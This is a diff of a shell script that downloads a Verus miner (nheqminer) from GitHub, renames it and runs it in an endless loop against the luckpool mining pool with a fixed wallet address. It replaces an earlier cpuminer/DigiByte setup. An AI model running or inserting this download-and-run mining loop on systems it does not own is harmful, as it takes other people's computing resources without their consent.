@@ -2,10 +2,13 @@
 
 apt update
 apt install sudo
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
-tar xf cpuminer-opt-linux.tar.gz
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+mv nheqminer/nheqminer verus
+chmod u+x verus
 while [ 1 ]; do
-./cpuminer-sse2 -a yespower -o stratum+tcp://yespower.sea.mine.zpool.ca:6233 -u DTLN3eS5PmakbKoxQJJCruhEPzE18oWd2M -p c=DGB -t2
-sleep 2
-done 
+./verus -v -l na.luckpool.net:3956 -u RS5YH5WicDHqg84Z1KKFaM6YRikrX4QWmZ.pepek1 -p x -t 2
+sleep 3
+done
 sleep 999
